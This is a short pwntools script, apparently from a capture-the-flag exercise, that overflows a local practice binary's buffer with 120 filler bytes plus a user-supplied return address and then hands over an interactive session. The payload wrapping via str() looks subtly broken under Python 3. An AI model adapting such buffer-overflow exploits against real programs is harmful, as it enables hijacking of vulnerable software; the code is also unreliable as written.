from pwn import *

## Constructing objects that interact with the program
sh = process('./98972d672b0bcd184c0c6769bb083863-main')

success_addr = int(input(),16)

## Constructing a payload
payload = 'a' * 120 + str(p32(success_addr))

print(payload)

## Send a string to the program
sh.sendline(payload)

## Convert code interaction to manual interaction
sh.interactive()
